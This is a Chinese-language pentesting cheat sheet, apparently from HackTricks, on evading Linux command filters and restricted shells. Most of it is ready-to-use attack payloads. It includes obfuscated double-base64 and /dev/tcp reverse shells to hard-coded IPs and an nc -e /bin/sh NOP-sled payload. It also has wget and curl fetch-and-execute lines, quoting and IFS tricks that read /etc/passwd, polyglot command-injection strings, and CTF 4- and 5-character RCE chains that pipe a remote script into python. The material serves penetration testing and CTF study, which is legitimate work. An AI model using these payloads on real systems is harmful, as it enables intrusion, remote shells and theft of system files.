# 绕过 Linux 限制

{{#include ../../../banners/hacktricks-training.md}}

## 常见限制绕过

PayloadsAllTheThings、Bo0oM 的 cheat sheet，以及两个链接的 Secjuice 文章中的命令注入和 WAF 规避内容，为本节介绍的 shell 语法变体提供了背景知识。<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)</sup>

如需识别 shell sink 并确认盲执行，请参阅 [Command Injection](../../../pentesting-web/command-injection.md)。

### Reverse Shell

```bash
# Double-Base64 payload
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
# echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```

### 短小 Rev shell

```bash
#Trick from Dikline
#Get a rev shell with
(sh)0>/dev/tcp/10.10.10.10/443
#Then get the out of the rev shell executing inside of it:
exec >&0
```

### Bypass 路径与禁用词

```bash
# Question mark binary substitution
/usr/bin/p?ng # /usr/bin/ping
nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost

# Wildcard(*) binary substitution
/usr/bin/who*mi # /usr/bin/whoami

# Wildcard + local directory arguments
touch -- -la # -- stops processing options after the --
ls *
echo * #List current files and folders with echo and wildcard

# [chars]
/usr/bin/n[c] # /usr/bin/nc

# Quotes
'p'i'n'g # ping
"w"h"o"a"m"i # whoami
ech''o test # echo test
ech""o test # echo test
bas''e64 # base64

#Backslashes
\u\n\a\m\e \-\a # uname -a
/\b\i\n/////s\h

# $@
who$@ami #whoami

# Transformations (case, reverse, base64)
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #whoami -> Upper case to lower case
$(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
$(rev<<<'imaohw') #whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64

# Execution through $0
echo whoami|$0

# Uninitialized variables: A uninitialized variable equals to null (nothing)
cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters

# New lines
p\
i\
n\
g # These 4 lines will equal to ping

# Fake commands
p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
w`u`h`u`o`u`a`u`m`u`i # Equals to whoami but 5 errors trying to execute "u" are shown

# Concatenation of strings using history
!-1 # This will be substitute by the last command executed, and !-2 by the penultimate command
mi # This will throw an error
whoa # This will throw an error
!-1!-2 # This will execute whoami
```

### 绕过被禁止的空格

```bash
# {form}
{cat,lol.txt} # cat lol.txt
{echo,test} # echo test

# IFS - Internal field separator, change " " for any other character ("]" in this case)
cat${IFS}/etc/passwd # cat /etc/passwd
cat$IFS/etc/passwd # cat /etc/passwd

# Put the command line in a variable and then execute it
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b # Using 2 ";"
IFS=,;`cat<<<cat,/etc/passwd` # Using cat twice
#  Other way, just change each space for ${IFS}
echo${IFS}test

# Using hex format
X=$'cat\x20/etc/passwd'&&$X

# Using tabs
echo "ls\x09-l" | bash

# Undefined variables and !
$u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
uname!-1\-a # This equals to uname -a
```

### 绕过反斜杠和斜杠

```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```

### Bypass pipes

```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

### 使用十六进制编码绕过限制

```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat "$abc"
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
cat `xxd -r -p <<< 2f6574632f706173737764`
xxd -r -ps <(echo 2f6574632f706173737764)
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```

### 使用八进制引用构造无字母命令名

Bash 的 ANSI-C `$'...'` 引用会在构造命令词时解码八进制转义序列。<sup>[[7]](#references)</sup>

因此，如果字母 denylist 仍允许 `$`、单引号、反斜杠、数字和命令分隔符，就可能失效。这不能绕过作为正确引用的数据参数传入的输入。<sup>[[13]](#references)</sup>

在这个本地测试中，`:` 代表前面的命令，`\151\144` 会解码为 `id`。<sup>[[7]](#references)</sup> 如果有可用的词分隔符，参数可以编码为独立的词。<sup>[[13]](#references)</sup>

```bash
:;$'\151\144'
```

### Bypass IPs

```bash
# Decimal IPs
127.0.0.1 == 2130706433
```

### 基于时间的数据外传

```bash
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```

### 从环境变量中获取字符

```bash
echo ${LS_COLORS:10:1} #;
echo ${PATH:0:1} #/
```

### DNS 数据外传

对于带外回调，Burp Collaborator 这类 collaborator 服务可以诱使目标应用与外部服务器交互；现有的 [**pingb**](http://pingb.in) 链接仅作为历史导航保留，并不表示该服务目前可用。<sup>[[6]](#references)</sup>

### Builtins

在受限 shell 中，可用的 builtins 是这些示例剩余的命令接口；Bash 文档介绍了其 builtin 命令和执行语法。<sup>[[7]](#references)</sup> 灵感来自 [**devploit**](https://twitter.com/devploit)。\
从现有的 [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html) 导航开始，然后尝试以下 Bash 专属技巧：<sup>[[7]](#references)</sup>

```bash
# Get list of builtins
declare builtins

# In these cases PATH won't be set, so you can try to set it
PATH="/bin" /bin/ls
export PATH="/bin"
declare PATH="/bin"
SHELL=/bin/bash

# Hex
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")

# Input
read aaa; exec $aaa #Read more commands to execute and execute them
read aaa; eval $aaa

# Get "/" char using printf and env vars
printf %.1s "$PWD"
## Execute /bin/ls
$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls
## To get several letters you can use a combination of printf and
declare
declare functions
declare historywords

# Read flag in current dir
source f*
flag.txt:1: command not found: CTF{asdasdasd}

# Read file with read
while read -r line; do echo $line; done < /etc/passwd

# Get env variables
declare

# Get history
history
declare history
declare historywords

# Disable special builtins chars so you can abuse them as scripts
[ #[: ']' expected
## Disable "[" as builtin and enable it as script
enable -n [
echo -e '#!/bin/bash\necho "hello!"' > /tmp/[
chmod +x [
export PATH=/tmp:$PATH
if [ "a" ]; then echo 1; fi # Will print hello!
```

### Polyglot command injection

```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```

### 绕过潜在的正则表达式

```bash
# A regex that only allow letters and numbers might be vulnerable to new line characters
1%0a`curl http://attacker.com`
```

### Bashfuscator

以下命令使用 Bashfuscator，这是一个开源 Bash 混淆框架；代码注释中的仓库链接保留作导航用途。<sup>[[8]](#references)</sup>

```bash
# From https://github.com/Bashfuscator/Bashfuscator
./bashfuscator -c 'cat /etc/passwd'
```

### 使用 5 个字符实现 RCE

以下两个历史上的 5 字符示例作为挑战复现保留：主要挑战仓库可在 [Orange Tsai 的仓库](https://github.com/orangetw/My-CTF-Web-Challenges) 中找到，而代码块中的第二个 write-up 链接仅用于导航，其当前可用性未经验证。<sup>[[9]](#references)</sup>

```bash
# From the Orange Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
#Orange Tsai solution
## Step 1: generate `ls -t>g` to file "_" to be able to execute ls ordening names by cration date
http://host/?cmd=>ls\
http://host/?cmd=ls>_
http://host/?cmd=>\ \
http://host/?cmd=>-t\
http://host/?cmd=>\>g
http://host/?cmd=ls>>_

## Step2: generate `curl orange.tw|python` to file "g"
## by creating the necesary filenames and writting that content to file "g" executing the previous generated file
http://host/?cmd=>on
http://host/?cmd=>th\
http://host/?cmd=>py\
http://host/?cmd=>\|\
http://host/?cmd=>tw\
http://host/?cmd=>e.\
http://host/?cmd=>ng\
http://host/?cmd=>ra\
http://host/?cmd=>o\
http://host/?cmd=>\ \
http://host/?cmd=>rl\
http://host/?cmd=>cu\
http://host/?cmd=sh _
# Note that a "\" char is added at the end of each filename because "ls" will add a new line between filenames whenwritting to the file

## Finally execute the file "g"
http://host/?cmd=sh g


# Another solution from https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
# Instead of writing scripts to a file, create an alphabetically ordered the command and execute it with "*"
https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
## Execute tar command over a folder
http://52.199.204.34/?cmd=>tar
http://52.199.204.34/?cmd=>zcf
http://52.199.204.34/?cmd=>zzz
http://52.199.204.34/?cmd=*%20/h*

# Another curiosity if you can read files of the current folder
ln /f*
## If there is a file /flag.txt that will create a hard link
## to it in the current folder
```

### 使用 4 个字符实现 RCE

```bash
# In a similar fashion to the previous bypass this one just need 4 chars to execute commands
# it will follow the same principle of creating the command `ls -t>g` in a file
# and then generate the full command in filenames
# generate "g> ht- sl" to file "v"
'>dir'
'>sl'
'>g\>'
'>ht-'
'*>v'

# reverse file "v" to file "x", content "ls -th >g"
'>rev'
'*v>x'

# generate "curl orange.tw|python;"
'>\;\\'
'>on\\'
'>th\\'
'>py\\'
'>\|\\'
'>tw\\'
'>e.\\'
'>ng\\'
'>ra\\'
'>o\\'
'>\ \\'
'>rl\\'
'>cu\\'

# got shell
'sh x'
'sh g'
```

## 只读/Noexec/Distroless 绕过

如果你处于启用了**只读和 noexec 保护**的文件系统中，或处于**distroless 镜像**中，环境会施加执行限制，这些限制记录在 Linux `mount(8)` 手册和 Distroless 项目文档中；链接页面汇集了在这些限制下操作的技巧。<sup>[[11]](#references)[[12]](#references)</sup>

{{#ref}}
bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

## Chroot 与其他 Jail 绕过

{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

## 基于空格的 Bash NOP Sled（“Bashsledding”）

当漏洞允许你部分控制一个最终传递给 `system()` 或其他 shell 的参数时，payload 的偏移量可能不确定。Alan Cao 和 Will Tan 描述了一种受限的嵌入式设备场景：他们将 shell payload 喷射到内存映射的 NVRAM 中，并在前面加上空格。<sup>[[5]](#references)</sup>

因此，你可以为 *Bash* 创建一个 *NOP sled*：在实际命令前加上一长串空格或制表符；Bash 将空格和制表符定义为简单命令中用于分隔单词的空白字符。<sup>[[5]](#references)[[7]](#references)</sup>

```bash
# Payload sprayed into an environment variable / NVRAM entry
"                nc -e /bin/sh 10.0.0.1 4444"
# 16× spaces ───┘ ↑ real command
```

如果 ROP chain（或其他内存破坏原语）传入的命令字符串指针指向空格块中的任意位置，Bash 都可以解析剩余的前导空格，直到遇到命令；在引用的路由器 exploit 中，这使得不确定的字符串偏移量也能使用。<sup>[[5]](#references)[[7]](#references)</sup>

在受限的嵌入式目标中，实际应用场景包括：<sup>[[5]](#references)</sup>

1. **内存映射的配置 blob**（例如 NVRAM），可供多个进程访问。<sup>[[5]](#references)</sup>
2. 攻击者无法写入 NULL 字节来对齐 payload 的 payload 通道（这是对齐问题的一种通用变体）。<sup>[[5]](#references)</sup>
3. 使用精简 BusyBox `ash`/`sh` 环境的嵌入式设备；BusyBox 将其文档列为资源受限系统中的 applet。<sup>[[10]](#references)</sup>

> 🛠️  在受控实验环境中，将此技术与调用 `system()` 的 ROP gadgets 结合使用；引用的路由器研究展示了这种组合在受限硬件上的应用。<sup>[[5]](#references)</sup>



## References

- [1] [PayloadsAllTheThings - 命令注入](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
- [2] [Bo0oM - WAF 绕过速查表](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
- [3] [Web 应用防火墙（WAF）规避技术 #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
- [4] [Web 应用防火墙（WAF）规避技术 #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
- [5] [Alan Cao 和 Will Tan — 利用废弃硬件中的零日漏洞 – Trail of Bits 博客](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [6] [Burp Collaborator - PortSwigger](https://portswigger.net/burp/documentation/desktop/tools/collaborator)
- [7] [bash(1) — Linux 手册页](https://man7.org/linux/man-pages/man1/bash.1.html)
- [8] [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
- [9] [My-CTF-Web-Challenges — Orange Tsai](https://github.com/orangetw/My-CTF-Web-Challenges)
- [10] [BusyBox](https://busybox.net/downloads/BusyBox.html)
- [11] [mount(8) — Linux 手册页](https://man7.org/linux/man-pages/man8/mount.8.html)
- [12] [Distroless](https://github.com/GoogleContainerTools/distroless)
- [13] [Dojo CTF #36：Shell Escape writeup — YesWeHack](https://www.yeswehack.com/dojo/dojo-ctf-challenge-winners-36)
{{#include ../../../banners/hacktricks-training.md}}
